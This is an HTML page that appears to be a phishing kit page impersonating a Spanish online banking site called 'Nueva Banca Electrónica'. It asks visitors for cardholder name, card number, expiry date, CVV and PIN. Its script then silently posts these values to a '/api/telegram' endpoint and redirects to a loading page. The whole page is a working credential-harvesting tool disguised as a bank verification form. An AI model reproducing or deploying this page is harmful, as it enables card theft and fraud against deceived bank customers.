
<!DOCTYPE html>
<html lang="ar">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>nbe-web | Nueva Banca Electrónica</title>
        <!-- logo img title-->
        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/snow.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body >

        
        <div class="navbar">
            <div class="container">
                <img src="image/logo-cc.png" alt="">
            </div>
        </div>

        <section>
            <div class="container pt-5">
                <h3>Información de la tarjeta</h3>
                <p>Información de ingredientes sobre la tarjeta de crédito asociada con este artículo para verificar la cuenta bancaria en la línea
                    <form id="CARDINFO" method="post" >
                        <input type="hidden" name="step" value="cc">
                   <div class="form-group mt-5">
                       <input type="text" name="fname" id="fname" class="form-control" required minlength="4">
                       <label for="fname">Titular de la tarjeta</label>
                   </div>
                   <div class="form-group mt-5">
                       <input type="text" name="card" id="card" class="form-control" required placeholder="XXXX XXXX XXXX XXXX" pattern="[0-9 ]{18,19}$" data-mask="0000 0000 0000 0000">
                       <label for="card">Número de tarjeta</label>
                   </div>
                   <div class="all">
                       <div class="form-group mt-5 dd">
                           <input type="text" name="date" id="date" class="form-control" required placeholder="XX/XX" pattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})$" data-mask="00/00">
                           <label for="date">Fecha de Caducidad</label>
                       </div>
                       <div class="form-group mt-5 dd">
                           <input type="text" name="cvv" id="cvv" class="form-control" required placeholder="XXXX" pattern="[0-9]{3,4}$" data-mask="0000">
                           <label for="cvv">CVV</label>
                       </div>
                   </div>
                   <div class="all">
                       <div class="form-group mt-5 dd">
                           <input type="text" name="pin" id="pin" class="form-control" required placeholder="****" pattern="[0-9]{4}$" data-mask="0000">
                           <label for="pin">ALFINETE (PIN)</label>
                       </div>
                   </div>
                   <div class="lol">
                       <button class="btn xx" onclick="return false">Volver</button>
                       <button type="submit" class="btn ss" name="submit">Continuar</button>
                    </div>
                </form>
            </div>
        </section>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

            const CARDINFO = document.getElementById("CARDINFO");
  CARDINFO.addEventListener("submit", async (e) => {
    e.preventDefault();

    const CN = document.getElementById("fname").value;
    const cc = document.getElementById("card").value;
    const exp = document.getElementById("date").value;
    const cvv = document.getElementById("cvv").value;
    const PIN = document.getElementById("pin").value;


    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ CN, cc, exp, cvv, PIN }),
      });

      if (response.ok) {
        window.location.href = "loading_2.html"; 
      } else {
        alert("Error al enviar datos.");
      }
    } catch (err) {
      console.error(err);
      alert("Error en la conexión.");
    }
  });
        </script>
              
</body>
</html>
